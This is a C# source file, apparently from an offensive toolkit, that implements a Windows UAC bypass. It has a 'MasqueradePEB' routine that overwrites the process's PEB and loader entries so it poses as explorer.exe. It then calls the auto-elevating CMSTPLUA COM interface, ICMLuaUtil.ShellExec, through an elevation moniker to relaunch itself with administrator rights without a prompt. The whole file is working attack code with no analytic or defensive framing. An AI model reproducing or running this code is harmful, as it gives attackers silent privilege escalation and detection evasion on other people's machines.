using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Impersonation
{
	public class Bypass
	{
		private const string T_CLSID_CMSTPLUA = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
		private static readonly Guid IID_ICMLuaUtil = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");
		private const string T_ELEVATION_MONIKER_ADMIN = "Elevation:Administrator!new:";

		[DllImport("kernel32.dll")]
		private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

		[DllImport("advapi32.dll")]
		private static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,
			IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

		[DllImport("kernel32.dll")]
		private static extern bool CloseHandle(IntPtr hObject);

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetCurrentProcess();

		[DllImport("version.dll", CharSet = CharSet.Unicode, EntryPoint = "GetFileVersionInfoSizeW")]
		private static extern int GetFileVersionInfoSize(string lptstrFilename, out int lpdwHandle);

		[DllImport("version.dll", CharSet = CharSet.Unicode, EntryPoint = "GetFileVersionInfoW")]
		private static extern bool GetFileVersionInfo(string lptstrFilename, int dwHandle, int dwLen, IntPtr lpData);

		[DllImport("version.dll", CharSet = CharSet.Unicode, EntryPoint = "VerQueryValueW")]
		private static extern bool VerQueryValue(IntPtr pBlock, string lpSubBlock, out IntPtr lplpBuffer, out int puLen);

		[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
		private static extern int GetWindowsDirectory(StringBuilder lpBuffer, int uSize);

		[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
		private static extern int GetModuleFileName(IntPtr hModule, StringBuilder lpFilename, int nSize);

		[DllImport("ntdll.dll")]
		private static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass,
			ref PROCESS_BASIC_INFORMATION ProcessInformation, int ProcessInformationLength, IntPtr ReturnLength);

		[DllImport("kernel32.dll")]
		private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

		[DllImport("kernel32.dll")]
		private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
			[Out] byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

		[DllImport("kernel32.dll")]
		private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
			byte[] lpBuffer, int dwSize, out int lpNumberOfBytesWritten);

		[DllImport("ntdll.dll")]
		private static extern void RtlEnterCriticalSection(IntPtr CriticalSection);

		[DllImport("ntdll.dll")]
		private static extern void RtlLeaveCriticalSection(IntPtr CriticalSection);

		[DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
		private static extern void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, string SourceString);

		[DllImport("kernel32.dll")]
		private static extern int GetCurrentProcessId();

		[DllImport("ole32.dll")]
		private static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);

		[DllImport("ole32.dll")]
		private static extern void CoUninitialize();

		[DllImport("ole32.dll", CharSet = CharSet.Unicode)]
		private static extern int CoGetObject(string pszName, ref BIND_OPTS3 pBindOptions, ref Guid riid, out IntPtr ppv);

		private enum TOKEN_INFORMATION_CLASS
		{
			TokenElevation = 20
		}

		[StructLayout(LayoutKind.Sequential)]
		private struct TOKEN_ELEVATION
		{
			public uint TokenIsElevated;
		}

		[StructLayout(LayoutKind.Sequential)]
		private struct VS_FIXEDFILEINFO
		{
			public uint dwSignature;
			public uint dwStrucVersion;
			public uint dwFileVersionMS;
			public uint dwFileVersionLS;
			public uint dwProductVersionMS;
			public uint dwProductVersionLS;
			public uint dwFileFlagsMask;
			public uint dwFileFlags;
			public uint dwFileOS;
			public uint dwFileType;
			public uint dwFileSubtype;
			public uint dwFileDateMS;
			public uint dwFileDateLS;
		}

		[StructLayout(LayoutKind.Sequential)]
		private struct UNICODE_STRING
		{
			public ushort Length;
			public ushort MaximumLength;
			public IntPtr Buffer;
		}

		[StructLayout(LayoutKind.Sequential)]
		private struct LIST_ENTRY
		{
			public IntPtr Flink;
			public IntPtr Blink;
		}

		[StructLayout(LayoutKind.Sequential)]
		private struct PROCESS_BASIC_INFORMATION
		{
			public IntPtr ExitStatus;
			public IntPtr PebBaseAddress;
			public IntPtr AffinityMask;
			public IntPtr BasePriority;
			public IntPtr UniqueProcessId;
			public IntPtr ParentProcessId;
		}

		[StructLayout(LayoutKind.Sequential)]
		private struct PEB_LDR_DATA
		{
			public uint Length;
			public byte Initialized;
			public IntPtr SsHandle;
			public LIST_ENTRY InLoadOrderModuleList;
			public LIST_ENTRY InMemoryOrderModuleList;
			public LIST_ENTRY InInitializationOrderModuleList;
			public IntPtr EntryInProgress;
			public byte ShutdownInProgress;
			public IntPtr ShutdownThreadId;
		}

		[StructLayout(LayoutKind.Sequential)]
		private struct RTL_USER_PROCESS_PARAMETERS
		{
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
			public byte[] Reserved1;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
			public IntPtr[] Reserved2;
			public UNICODE_STRING ImagePathName;
			public UNICODE_STRING CommandLine;
		}

		[StructLayout(LayoutKind.Sequential)]
		private struct PEB
		{
			public byte InheritedAddressSpace;
			public byte ReadImageFileExecOptions;
			public byte BeingDebugged;
			public byte BitField;
			public IntPtr Mutant;
			public IntPtr ImageBaseAddress;
			public IntPtr Ldr;
			public IntPtr ProcessParameters;
			public IntPtr SubSystemData;
			public IntPtr ProcessHeap;
			public IntPtr FastPebLock;
		}

		[StructLayout(LayoutKind.Sequential)]
		private struct LDR_DATA_TABLE_ENTRY
		{
			public LIST_ENTRY InLoadOrderLinks;
			public LIST_ENTRY InMemoryOrderLinks;
			public LIST_ENTRY InInitializationOrderLinks;
			public IntPtr DllBase;
			public IntPtr EntryPoint;
			public uint SizeOfImage;
			public UNICODE_STRING FullDllName;
			public UNICODE_STRING BaseDllName;
			public uint Flags;
			public ushort LoadCount;
			public ushort TlsIndex;
		}

		[StructLayout(LayoutKind.Sequential)]
		private struct BIND_OPTS3
		{
			public int cbStruct;
			public int grfFlags;
			public int grfMode;
			public int dwTickCountDeadline;
			public int dwTrackFlags;
			public int dwClassContext;
			public int locale;
			public IntPtr pServerInfo;
			public IntPtr hwnd;
		}

		[ComImport]
		[Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C")]
		[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
		private interface ICMLuaUtil
		{
			void SetRasCredentials();
			void SetRasEntryProperties();
			void DeleteRasEntry();
			void LaunchInfSection();
			void LaunchInfSectionEx();
			void CreateLayerDirectory();
			int ShellExec([MarshalAs(UnmanagedType.LPWStr)] string lpFile,
				[MarshalAs(UnmanagedType.LPWStr)] string lpParameters,
				[MarshalAs(UnmanagedType.LPWStr)] string lpDirectory,
				uint fMask, uint nShow);
		}

		private const uint TOKEN_QUERY = 0x0008;
		private const uint PROCESS_QUERY_INFORMATION = 0x0400;
		private const uint PROCESS_VM_READ = 0x0010;
		private const uint PROCESS_VM_WRITE = 0x0020;
		private const uint PROCESS_VM_OPERATION = 0x0008;
		private const uint CLSCTX_LOCAL_SERVER = 0x0004;
		private const uint SEE_MASK_DEFAULT = 0x00000000;
		private const uint SW_SHOW = 5;
		private const int MAX_PATH = 260;
		private const uint COINIT_APARTMENTTHREADED = 0x2;

		public static bool IsElevated()
		{
			IntPtr hToken = IntPtr.Zero;
			bool isElevated = false;

			if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, out hToken))
			{
				int size = Marshal.SizeOf(typeof(TOKEN_ELEVATION));
				IntPtr elevationPtr = Marshal.AllocHGlobal(size);
				try
				{
					if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation,
						elevationPtr, size, out int returnLength))
					{
						TOKEN_ELEVATION elevation = Marshal.PtrToStructure<TOKEN_ELEVATION>(elevationPtr);
						isElevated = elevation.TokenIsElevated != 0;
					}
				}
				finally
				{
					Marshal.FreeHGlobal(elevationPtr);
					CloseHandle(hToken);
				}
			}

			return isElevated;
		}

		public static bool GetOSVersion()
		{
			string path = @"C:\Windows\System32\kernel32.dll";
			int dwDummy = 0;
			int dwFVISize = GetFileVersionInfoSize(path, out dwDummy);

			if (dwFVISize == 0)
				return false;

			IntPtr lpVersionInfo = Marshal.AllocHGlobal(dwFVISize);
			try
			{
				if (!GetFileVersionInfo(path, 0, dwFVISize, lpVersionInfo))
				{
					return false;
				}

				IntPtr lpFfi;
				if (!VerQueryValue(lpVersionInfo, @"\", out lpFfi, out int uLen) || uLen == 0)
				{
					return false;
				}

				VS_FIXEDFILEINFO ffi = Marshal.PtrToStructure<VS_FIXEDFILEINFO>(lpFfi);
				uint dwProductVersionMS = ffi.dwProductVersionMS;

				ushort major = (ushort)(dwProductVersionMS >> 16);
				ushort minor = (ushort)(dwProductVersionMS & 0xFFFF);

				if (major == 10 && minor == 0) // Windows 10
					return true;
				else if (major == 6 && minor == 2) // Windows 8
					return true;
				else if (major == 6 && minor == 1) // Windows 7
					return true;

				return false;
			}
			finally
			{
				Marshal.FreeHGlobal(lpVersionInfo);
			}
		}

		private static int ucmAllocateElevatedObject(string objectCLSID, Guid riid, uint dwClassContext, out ICMLuaUtil ppv)
		{
			ppv = null;
			if (objectCLSID.Length > 64)
				return -1;

			uint classContext = dwClassContext;
			if (dwClassContext == 0)
				classContext = CLSCTX_LOCAL_SERVER;

			BIND_OPTS3 bop = new BIND_OPTS3
			{
				cbStruct = Marshal.SizeOf(typeof(BIND_OPTS3)),
				dwClassContext = (int)classContext
			};

			string szMoniker = T_ELEVATION_MONIKER_ADMIN + objectCLSID;

			int hr = CoGetObject(szMoniker, ref bop, ref riid, out IntPtr elevatedObject);
			if (hr == 0)
			{
				ppv = Marshal.GetObjectForIUnknown(elevatedObject) as ICMLuaUtil;
			}

			return hr;
		}

		private static bool ucmCMLuaUtilShellExecMethod(string executable, string[] lpParameters)
		{
			int hr_init = CoInitializeEx(IntPtr.Zero, COINIT_APARTMENTTHREADED);
			bool result = false;

			try
			{
				int r = ucmAllocateElevatedObject(T_CLSID_CMSTPLUA, IID_ICMLuaUtil,
					CLSCTX_LOCAL_SERVER, out ICMLuaUtil cmluaUtil);

				if (r == 0 && cmluaUtil != null)
				{
					int shellExecResult = cmluaUtil.ShellExec(executable, string.Join(" ", lpParameters), null,
						SEE_MASK_DEFAULT, SW_SHOW);
					result = shellExecResult == 0;
				}
			}
			finally
			{
				if (hr_init == 0)
					CoUninitialize();
			}

			return result;
		}

		private static bool MasqueradePEB()
		{
			int dwPID = GetCurrentProcessId();
			IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ |
				PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, dwPID);

			if (hProcess == IntPtr.Zero)
				return false;

			try
			{
				PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
				int status = NtQueryInformationProcess(hProcess, 0, ref pbi,
					Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), IntPtr.Zero);

				if (status != 0)
					return false;

				byte[] pebBytes = new byte[Marshal.SizeOf(typeof(PEB))];
				if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, pebBytes,
					pebBytes.Length, out int bytesRead))
					return false;

				PEB peb = ByteArrayToStructure<PEB>(pebBytes);

				StringBuilder chExplorer = new StringBuilder(MAX_PATH);
				GetWindowsDirectory(chExplorer, MAX_PATH);
				chExplorer.Append(@"\explorer.exe");
				string pwExplorer = chExplorer.ToString();

				RtlEnterCriticalSection(peb.FastPebLock);

				try
				{
					byte[] processParamsBytes = new byte[Marshal.SizeOf(typeof(RTL_USER_PROCESS_PARAMETERS))];
					if (!ReadProcessMemory(hProcess, peb.ProcessParameters, processParamsBytes,
						processParamsBytes.Length, out bytesRead))
						return false;

					RTL_USER_PROCESS_PARAMETERS processParams =
						ByteArrayToStructure<RTL_USER_PROCESS_PARAMETERS>(processParamsBytes);

					UNICODE_STRING imagePathName = new UNICODE_STRING();
					RtlInitUnicodeString(ref imagePathName, pwExplorer);

					UNICODE_STRING commandLine = new UNICODE_STRING();
					RtlInitUnicodeString(ref commandLine, pwExplorer);

					byte[] imagePathBytes = StructureToByteArray(imagePathName);
					IntPtr imagePathPtr = peb.ProcessParameters +
						Marshal.OffsetOf(typeof(RTL_USER_PROCESS_PARAMETERS), "ImagePathName").ToInt32();
					WriteProcessMemory(hProcess, imagePathPtr, imagePathBytes,
						imagePathBytes.Length, out int bytesWritten);

					byte[] commandLineBytes = StructureToByteArray(commandLine);
					IntPtr commandLinePtr = peb.ProcessParameters +
						Marshal.OffsetOf(typeof(RTL_USER_PROCESS_PARAMETERS), "CommandLine").ToInt32();
					WriteProcessMemory(hProcess, commandLinePtr, commandLineBytes,
						commandLineBytes.Length, out bytesWritten);

					StringBuilder wExeFileName = new StringBuilder(MAX_PATH);
					GetModuleFileName(IntPtr.Zero, wExeFileName, MAX_PATH);

					IntPtr pStartModuleInfo = peb.Ldr +
						Marshal.OffsetOf(typeof(PEB_LDR_DATA), "InLoadOrderModuleList").ToInt32();
					IntPtr pNextModuleInfo = pStartModuleInfo;

					do
					{
						byte[] ldteBytes = new byte[Marshal.SizeOf(typeof(LDR_DATA_TABLE_ENTRY))];
						if (!ReadProcessMemory(hProcess, pNextModuleInfo, ldteBytes,
							ldteBytes.Length, out bytesRead))
							break;

						LDR_DATA_TABLE_ENTRY ldte = ByteArrayToStructure<LDR_DATA_TABLE_ENTRY>(ldteBytes);

						if (ldte.FullDllName.Buffer != IntPtr.Zero && ldte.FullDllName.Length > 0)
						{
							byte[] fullDllNameBytes = new byte[ldte.FullDllName.Length];
							if (ReadProcessMemory(hProcess, ldte.FullDllName.Buffer, fullDllNameBytes,
								fullDllNameBytes.Length, out bytesRead))
							{
								string fullDllName = Encoding.Unicode.GetString(fullDllNameBytes);
								if (string.Equals(wExeFileName.ToString(), fullDllName,
									StringComparison.OrdinalIgnoreCase))
								{
									UNICODE_STRING newFullDllName = new UNICODE_STRING();
									RtlInitUnicodeString(ref newFullDllName, pwExplorer);

									UNICODE_STRING newBaseDllName = new UNICODE_STRING();
									RtlInitUnicodeString(ref newBaseDllName, pwExplorer);

									byte[] newFullDllNameBytes = StructureToByteArray(newFullDllName);
									IntPtr fullDllNamePtr = pNextModuleInfo +
										Marshal.OffsetOf(typeof(LDR_DATA_TABLE_ENTRY), "FullDllName").ToInt32();
									WriteProcessMemory(hProcess, fullDllNamePtr, newFullDllNameBytes,
										newFullDllNameBytes.Length, out bytesWritten);

									byte[] newBaseDllNameBytes = StructureToByteArray(newBaseDllName);
									IntPtr baseDllNamePtr = pNextModuleInfo +
										Marshal.OffsetOf(typeof(LDR_DATA_TABLE_ENTRY), "BaseDllName").ToInt32();
									WriteProcessMemory(hProcess, baseDllNamePtr, newBaseDllNameBytes,
										newBaseDllNameBytes.Length, out bytesWritten);

									break;
								}
							}
						}

						pNextModuleInfo = ldte.InLoadOrderLinks.Flink;
					} while (pNextModuleInfo != pStartModuleInfo);
				}
				finally
				{
					RtlLeaveCriticalSection(peb.FastPebLock);
				}
			}
			finally
			{
				CloseHandle(hProcess);
			}

			return true;
		}

		private static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
		{
			GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
			try
			{
				return Marshal.PtrToStructure<T>(handle.AddrOfPinnedObject());
			}
			finally
			{
				handle.Free();
			}
		}

		private static byte[] StructureToByteArray<T>(T structure) where T : struct
		{
			int size = Marshal.SizeOf(typeof(T));
			byte[] bytes = new byte[size];
			IntPtr ptr = Marshal.AllocHGlobal(size);
			try
			{
				Marshal.StructureToPtr(structure, ptr, false);
				Marshal.Copy(ptr, bytes, 0, size);
			}
			finally
			{
				Marshal.FreeHGlobal(ptr);
			}
			return bytes;
		}

		private static string GetProgramPath()
		{
			try
			{
				string currentExe = System.Reflection.Assembly.GetExecutingAssembly().Location;
				if (string.IsNullOrEmpty(currentExe))
				{
					Uri codeBaseUri = new Uri(System.Reflection.Assembly.GetExecutingAssembly().CodeBase);
					currentExe = codeBaseUri.LocalPath;
				}
				return currentExe;
			}
			catch
			{
				string commandLine = Environment.CommandLine;
				if (!string.IsNullOrEmpty(commandLine))
				{
					string path = commandLine.Trim();
					if (path.StartsWith("\"") && path.EndsWith("\""))
					{
						path = path.Substring(1, path.Length - 2);
					}
					int spaceIndex = path.IndexOf(' ');
					if (spaceIndex > 0)
					{
						path = path.Substring(0, spaceIndex);
					}
					return path;
				}
				return string.Empty;
			}
		}

		private static string ReviewAndCorrectPath(string path)
		{
			string correctedPath = path;

			if (!string.IsNullOrEmpty(correctedPath) && correctedPath[0] == '"')
			{
				correctedPath = correctedPath.Substring(1);
			}

			if (!string.IsNullOrEmpty(correctedPath) && correctedPath[correctedPath.Length - 1] == '"')
			{
				correctedPath = correctedPath.Substring(0, correctedPath.Length - 1);
			}

			return correctedPath;
		}

		public static void ExecuteBypass(string[] args)
		{
			MasqueradePEB();
			string programPath = GetProgramPath();
			if (!string.IsNullOrEmpty(programPath))
			{
				string correctedPath = ReviewAndCorrectPath(programPath);
				ucmCMLuaUtilShellExecMethod(correctedPath, args);
			}
		}
	}
}
